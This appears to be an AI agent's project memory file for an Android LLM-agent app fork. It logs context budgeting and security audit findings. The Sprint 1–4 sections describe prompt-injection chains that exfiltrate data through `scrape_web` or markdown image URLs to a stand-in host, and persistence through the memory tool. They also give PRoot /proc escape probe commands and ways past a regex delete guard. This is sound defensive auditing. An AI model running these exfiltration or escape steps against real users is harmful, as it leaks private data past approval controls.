# Agent project memory — RikkaHub on Vivo X300 / AICore / Gemma 4 E4B

Central memory for this fork. Keep it short; update after each sprint.
Tags: [CONFIRMED] [PROBABLE] [HYPOTHESIS] [FALSIFIED] [MITIGATED] [REQUIRES VIVO VALIDATION]

## Goal
Local agent on Vivo X300 (12 GB, Dimensity 9500): RikkaHub → AICore (ML Kit Prompt API)
→ Gemma 4 E4B (`nano-full` + PREVIEW) → GenerationLoop → tools. AICore stays the primary runtime.

## Hard facts about the runtime (source: ML Kit docs via search, 2026-09)
- Prompt API input limit: **< 4000 tokens**, system prefix included. Gemma 4 E4B's own
  128K window does NOT apply through AICore. [CONFIRMED doc] [REQUIRES VIVO VALIDATION]
- `maxOutputTokens` range 1..256, default 256. "Raise MAX_TOKENS" is impossible at the API. [CONFIRMED doc]
- `Candidate.finishReason` is an Int (`STOP` / `MAX_TOKENS` / `OTHER`), null mid-stream.
- `GenerativeModel.countTokens()` + `getTokenLimit()` exist — not used yet (signatures unverified).
- No native tool calling: tools go through the `<tool_call>{json}</tool_call>` text protocol.

## Where things are
- AICore provider (Android/ML Kit glue): `ai/.../providers/AICoreProvider.kt`
- AICore pure logic (budget, tool list, parser, continuation): `ai/.../providers/AICorePrompt.kt`
- Agent loop: `app/.../data/ai/GenerationLoop.kt` (maxSteps, wall-clock cap, LoopGuard on
  identical calls, replay safety for interrupted tools, approval states). Reads no finishReason.
- Approval policy: `app/.../data/ai/tools/ToolApprovalDefaults.kt`; workspace tools: `WorkspaceTools.kt`
- Floors (runtime, model-independent): `PathSafetyGuard.kt`, `HardlineCommandGuard.kt`,
  `data/ai/net/GuardedDns.kt` (SSRF), `workspace/.../WorkspaceFileSystem.kt` (confinement)

## Testing without Android build
Google Maven (dl.google.com) is blocked in the cloud sandbox → no AGP/Gradle build there.
`scripts/host-test/run.sh` compiles the Android-free sources with a standalone kotlinc and runs
114 JUnit tests + a scenario driver that runs the real `AICoreProvider.streamText` against a
scripted **fake** ML Kit (`scripts/host-test/stubs`, shape only, not the real AAR).
On a dev machine the same JUnit tests run with `./gradlew :ai:testDebugUnitTest :workspace:testDebugUnitTest :app:testDebugUnitTest`.
The repo has no CI.

## Android build (details: BUILD_ANDROID.md) — NOT yet performed anywhere
`:app`, variant debug, `git submodule update --init --recursive && ./gradlew :app:assembleDebug`
→ `app/build/outputs/apk/debug/app-arm64-v8a-debug.apk` (package `excp.rikkahub.debug`).
Gradle 9.5.0, AGP 9.3.1, Kotlin 2.4.10, compileSdk/targetSdk 37, minSdk 26, Java target 17,
JDK ≥ 17. SDK: platforms;android-37, cmake;3.22.1, default NDK. Also bun + pnpm + Node
(`:web` preBuild). Both git submodules are uninitialized in a fresh clone.

## Sprint 1 (2026-09-25) — findings and fixes
AICore / context
- [CONFIRMED→MITIGATED] Every tool-loop step is appended to the same assistant message, so the
  6-message window never trimmed a running task: 5×6 KB tool results → 30.6k-char prompt.
  Now token-budgeted (90% of 4000, ~3 chars/token, CJK = 1): task message pinned, newest tool
  result 2400 ch head+tail, older 400 ch, oldest steps dropped with a marker.
- [CONFIRMED→MITIGATED] Tool list: now ≤40% of budget, shows arg names (`name(a*, b)`),
  ranks used/task-relevant tools first. Hidden tools still execute if called.
- [CONFIRMED→MITIGATED] finishReason forwarded as "0"/"1". MAX_TOKENS → up to 2 continuation
  rounds (prefill = generated text, one parser across rounds, joiner drops restart/overlap),
  never after a tool call. Finish = stop / length / tool_calls.
- [CONFIRMED→MITIGATED] Last ≤10 chars lost when the final chunk carries text; Stop reported
  as "AICore error"; non-streaming mode dropped all tool calls; unclosed tool call surfaced as
  raw text without the tag.
- [MITIGATED] Tool output could forge `user:` turns / tool tags in the flat transcript.
- One retry at 60% budget on an input-overflow error before any output (error text heuristic).
Security
- [CONFIRMED→MITIGATED] `deleteRecursively` follows symlinks: workspace delete/move wiped the
  link target outside the root; tree() listed outside files. `deleteRecursivelyNoFollow` everywhere
  agent/shell-reachable.
- [CONFIRMED→MITIGATED] PathSafetyGuard: /data/data rule dead on device (canonical /data/user/0);
  own secrets (datastore, databases, shared_prefs, no_backup, app_webview, known_hosts) were reachable.
- [CONFIRMED→MITIGATED] telegram_send_* / ssh_upload / ssh_download bypassed PathSafetyGuard.
- [CONFIRMED→MITIGATED] browser_open: ungated egress (URL carries data) + LAN/loopback reachable.
- [CONFIRMED→MITIGATED] Hardline floor let `rm -rf /sdcard` (and DCIM, …) through.

## Open risks (not fixed — need a decision or a device)
- [CONFIRMED] Markdown images in model output auto-load any URL → approval-free exfil
  (`![](https://x/?d=…)`). Fix = click-to-load remote images in assistant messages (UX decision).
- [CONFIRMED] PRoot binds `/upload` (all chat attachments) and a writable `/skills` into the shell:
  the model can read every upload and persistently rewrite its own skills (prompt injection).
- [PROBABLE, REQUIRES VIVO VALIDATION] PRoot /proc escape. Host probe (generic `proot` 5.1.0
  from Ubuntu apt, x86_64, no `--link2symlink` — NOT the Termux-patched arm64 binary this app
  ships in `nativeLibraryDir`, so this result does not transfer 1:1): with `/proc` bound the
  same way `ProotShellRunner` binds it, `readlink /proc/<same-uid-pid>/cwd` (or `/root`) from
  inside the jail returns the real absolute host path — a plain information disclosure (reveals
  host directory layout, e.g. `/data/user/0/<pkg>/...`, from inside the jail). Actually opening
  or listing through that magic symlink (`ls`, `cat`) failed with ENOENT on this proot build:
  PRoot re-canonicalizes the resolved target through its own binding table before the kernel
  sees it, so the naive "cd into /proc/<pid>/root and read a file" escape did NOT reproduce
  here. This FALSIFIES the escape for proot 5.1.0/x86_64 without `--link2symlink`; it says
  nothing about the on-device Termux-patched binary (different version, arch, and that flag
  changes hardlink/symlink handling specifically). Vivo test: `ln -s /data/user/0/<pkg>
  /workspace/x/marker` then from a workspace_shell session `readlink /proc/self/root` and try
  `cat /proc/$PPID/root/data/user/0/<pkg>/files/datastore/*` with a throwaway marker file, not
  real data.
- [CONFIRMED] Hardline is regex-only (`r''m`, `$(echo rm)`, python rmtree pass) — by design;
  approval is the control. "Always Allow" on termux/workspace_shell removes it.
- [CONFIRMED] WebView redirects to private IPs are not checked (own network stack).
- [PROBABLE] Prompt rule "NEVER call a verification tool" (tuned for Nano loops) conflicts with
  verify-after-act; left unchanged until E4B behaviour is measured on the Vivo.
- MCP tools: always approval-gated; no per-server egress policy.

## Vivo validation checklist (nothing below is device-tested yet)
1. Build: `./gradlew :app:assembleDebug` — first real compile of this sprint's app/ai changes
   (only risk flagged: `Candidate.FinishReason.MAX_TOKENS` symbol, verified on docs only).
2. `adb logcat -s AICoreProvider` → `prompt round=N est=…tok prefix=…ch tools=a/b dropped=…`.
   Compare `est` with `countTokens` if possible; tune `AICORE_INPUT_TOKEN_BUDGET` / chars-per-token.
3. Long answer (> 256 tokens): check the continuation joins cleanly (no repeated text).
4. `write_file` with ~1 KB content: tool call cut at 256 tokens must complete in round 2.
5. 6+ step tool task: task still solved; no ErrorCode/overflow; note latency per round.
6. Overflow: paste ~15 KB text; expect one retry log, not a crash. Record the real error text.
7. Security: `ln -s /data/user/0/<pkg>/databases /workspace/x/l; delete x` → databases intact.

## Sprint 2 (2026-09-25) — environment blocker and code-level findings
This session runs in the same cloud sandbox as Sprint 1: no `adb`, no USB, no physical
device, and Google Maven is still blocked, so none of Sprint 2's device/build phases
(real `assembleDebug`, `adb install`, on-device AICore/tool-calling/security tests) could
be performed here. Nothing below is fabricated device output — see BLOCKER note.

[BLOCKER] Sprint 2 (real build → install → Vivo validation) requires the actual
Dell/Kubuntu machine with the Vivo X300 attached via USB. Not available in this session.
Do not re-attempt from a cloud session; resume Sprint 2 directly on the Dell using
BUILD_ANDROID.md, then work the checklist below.

- [CONFIRMED, code-level, no device needed] Explains the observed anomaly (`/workspace`
  visible, `/home` empty, `/storage/emulated/0` missing) exhaustively from
  `ProotShellRunner.buildCommand` + the only `WorkspaceBindMount` call site
  (`RepositoryModule.kt`):
  - **`/home` empty**: (A) genuinely present but empty — expected. `linuxDir` is whatever
    distro rootfs tarball the user picked in Settings (`RootfsInstaller` just downloads and
    extracts a URL; `RootfsPatcher` only touches `etc/resolv.conf`, `etc/hosts`,
    `etc/hostname`, locale, group names, and creates `tmp`/`var/tmp`/`root`). A minimal
    distro image ships `/home` empty because no user accounts were ever created in it —
    not a bug, not hidden by RikkaHub.
  - **`/storage/emulated/0` missing**: (F), by design, not a bug — there is no bind mount
    for it anywhere. The full bind list is exactly: `context.filesDir` → `/workspace`
    (hardcoded in `ProotShellRunner`), plus the three `WorkspaceBindMount`s in
    `RepositoryModule.kt` (`/skills`, `/tool_outputs`, `/upload`), plus
    `WorkspaceManager.KERNEL_FS_MOUNTS` (`/dev`, `/proc`, `/sys`). No `/sdcard`, no
    `/storage`, anywhere in the codebase. The workspace model is (and was already
    documented as) fully isolated app-private storage; shared storage is reached only
    through the separate file-manager tools (`PathSafetyGuard`-gated), never through the
    shell. This matches "workspace isolated" in the Goal section — working as intended,
    no fix needed. If shared-storage access from the shell is wanted, that is a product
    decision (bind `/sdcard` read-only, or a SAF-backed FUSE bridge), not a bug fix — not
    done here since it was not asked for and would widen the shell's reach.
- See the PRoot `/proc` entry above (Open risks) for the host probe of the escape
  hypothesis — falsified for a generic x86_64 proot build, unresolved for the real binary.

## Sprint 3 (2026-09-25) — approval model, headless, data egress (static analysis, HOST ONLY)
Approval path (reconstructed end to end):
tool factory → `needsApproval` lambda → `GenerationLoop` (Hardline first; prompts ONLY when
`needsApproval(input)` is true) → `isToolAutoApproved` in `ChatService` =
YOLO || `HeadlessConversations.shouldAutoApprove(conv)` || "Allow for this chat" || always-allow set
(workspace tools excluded) → Pending (UI / Telegram keyboard) or execute.
`ToolApprovalDefaults.ALWAYS_ASK` becomes `needsApproval` only via `ToolApprovalDefaults.applyTo`
(LocalTools, search tools); MCP tools use `requiresApproval(mcp__…)` in ChatService.
`ChatToolFactory.createTools` is dead code (never called).

- [CONFIRMED→MITIGATED] c7a1c46 listed scrape_web in ALWAYS_ASK but search tools skip the
  LocalTools mapping, so it still ran unprompted (its test only checked set membership).
  Fixed in 7c0f8d9 via `applyTo`; SearchToolsTest checks the real tool (Gradle), host covers applyTo.
- [CONFIRMED] `NO_ALWAYS_ALLOW` is UI-only: it hides the "Always Allow" button (chat + Telegram).
  Runtime never checks it, so it does not hold under YOLO, fully headless runs, or
  "Allow for this chat" (still offered for eval_javascript / keystore_decrypt / mcp_add …).
- [CONFIRMED] Fully headless = every tool auto-approved, NO_ALWAYS_ALLOW included. Triggers:
  CronJobWorker, SubAgentEngine (`subagent_dispatch`), SkillTestRunner, ExternalAutomationDispatcher.
  Telegram is browser-headless only (keeps its approval keyboard). Workflows run pre-authorised
  fixed actions (approved at `workflow_create`) — a sounder model. Floors still apply everywhere:
  Hardline, PathSafetyGuard, SSRF guard.
- [CONFIRMED, static chain, not executed] Approval laundering: one approval of
  `subagent_dispatch` (zero if Always-Allowed, zero inside cron) starts a headless run on the
  parent assistant with all its tools auto-approved, e.g. injected page → sub-agent →
  `list_recent_notifications` → `scrape_web("https://x/?d=…")`. Needs one human tap at most.
- [FALSIFIED] Backdoor via `external_automation_add_trusted_package("<adb>")` (which would let any
  app drive the exported RUN_TASK receiver): the tool's package regex rejects "<adb>". The
  activity path uses binder-verified `callingPackage` (correct).
- [CONFIRMED] Doc mismatch: ExternalAutomationTools KDoc says its mutating tools are
  NO_ALWAYS_ALLOW; they are only in ALWAYS_ASK.
- [CONFIRMED] `memory_tool` (create/edit/delete) is ungated: an injected turn can persist instructions into
  memory that are replayed in future chats (persistence, not egress).
- Markdown images (unchanged, [CONFIRMED] Sprint 1): `Markdown.kt` IMAGE → Coil, auto-load, no
  approval, no SSRF guard. `search_web`'s own description tells the model to embed `![](url)`
  from `images[]`, so a blanket block breaks that feature.

[REQUIRES PRODUCT DECISION] Headless policy — cannot tell from code whether NO_ALWAYS_ALLOW was
meant to hold headless (its KDoc names unattended cron; `mark()`'s KDoc says "tools auto-approve").
Proposed minimal policy, not implemented:
1. Headless/YOLO/chat-scope: NO_ALWAYS_ALLOW tools → Denied with an envelope (never Pending: no
   one can answer). Breaks only cron/sub-agent/external runs that use those 9 tools.
2. `subagent_dispatch`: the sub-agent inherits the parent's approval state instead of auto-approve
   (Pending surfaces in the parent chat), or run with read/local-only tools.
3. Headless network egress (web_fetch, web_extract, scrape_web, browser_open, telegram_send_*,
   ssh_*, mcp__*): allowed only if listed on that cron job / automation (per-job allowlist).
4. Markdown images: auto-load only URLs that already appeared in a tool result of the same
   conversation; others become tap-to-load.

Dell/Vivo checks added by Sprint 3: `./gradlew :app:testDebugUnitTest --tests '*SearchToolsTest*'`;
on device, `scrape_web` and `list_recent_notifications` must show an approval card.

## Sprint 4 (2026-09-25) — privilege boundaries (static + host tests, HOST ONLY)
Fix 01edfe9: one approval policy, `ToolApprovalDefaults.autoApproves` + `decide`, executed by
`GenerationLoop` per tool (after Hardline), with `RunKind` from `HeadlessConversations.runKind`:
| RunKind | who | gated tool not granted | NO_ALWAYS_ALLOW | memory_tool |
|---|---|---|---|---|
| INTERACTIVE | chat, Telegram | Prompt | Prompt every call (no YOLO/chat/always) | runs (ungated) |
| UNATTENDED | cron, external automation, skill tester | Run (auto) | Deny | Deny |
| DELEGATED | sub-agent (`markDelegated`) | Deny unless parent-chat grant / Always / YOLO | Deny | Deny |
Workflows and cron direct mode call `execute` directly (pre-authorised fixed actions): unchanged.

- [MITIGATED] Sub-agent approval laundering (Sprint 3): the sub-agent now inherits only its
  parent chat's grants. Evidence: ToolApprovalPolicyTest (decision matrix), HeadlessRunKindTest
  (real `HeadlessConversations` on host stubs). Wiring in ChatService/GenerationLoop/SubAgentEngine
  is not compiled here.
- [MITIGATED] NO_ALWAYS_ALLOW now enforced at runtime on every path (was UI-only). UI still shows
  "Allow for this chat" for these tools: it approves that one call only (cosmetic, not fixed).
- [FALSIFIED] sub-agent → sub-agent and cron → sub-agent: recursion guard rejects (`no_recursion`);
  ChatService passes the invocation context, so the guard is live on the main path.
- [CONFIRMED, not fixed] `subagent_dispatch` `tools` argument is stored, never enforced (the
  approval card suggests a scope that does not exist). With inherited grants it no longer widens
  privilege, but it is misleading. [REQUIRES PRODUCT DECISION]: enforce as allowlist or drop it.
- [CONFIRMED, not fixed] Interactive memory persistence: injected content → `memory_tool` (ungated)
  → `buildMemoryPrompt` puts memories in the system prompt of future chats, unframed.
  Does not reach AICore (AICorePrompt drops SYSTEM messages); reaches every cloud provider.
  [REQUIRES PRODUCT DECISION]: gate writes (ALWAYS_ASK, user may Always-Allow) or visible
  "memory changed" notice + frame memories as data. Blocked already in unattended/sub-agent runs.
- [CONFIRMED, not fixed] UNATTENDED runs still auto-approve egress (web_fetch, scrape_web,
  browser_open, telegram_send_*, ssh_*, mcp__*) and sensitive reads: a cron job that processes
  untrusted content can still chain notifications → network. [REQUIRES PRODUCT DECISION]:
  per-job tool allowlist at job creation (the workflow model).
- Grants are per tool name and per chat: approving a local read never authorises an egress tool.

Dell: `./gradlew :app:testDebugUnitTest` (first compile of 01edfe9). Vivo/Android: dispatch a
sub-agent asking it to `web_fetch` a marker URL without a parent grant → expect Denied
`not_authorised_for_this_run`; with "Allow for this chat" on web_fetch in the parent → runs;
cron job calling `eval_javascript` → Denied `requires_human_approval`.

## Next steps (priority order)
1. Build + Vivo checklist above; record results here.
2. Use `countTokens`/`getTokenLimit` for exact budgeting once the API is checked against the AAR.
3. Click-to-load for remote markdown images (egress).
4. Measure E4B tool-call accuracy with arg names vs without; decide on the "never verify" rule.
5. Persistent task state for AICore (goal + done steps + last result) so a dropped history
   still carries progress — only if step 5 of the checklist shows the model losing track.
6. Check upstream ExTV/rikkahub-agent and rikkahub/rikkahub for new commits (this fork was
   level with ExTV on 2026-09-24).
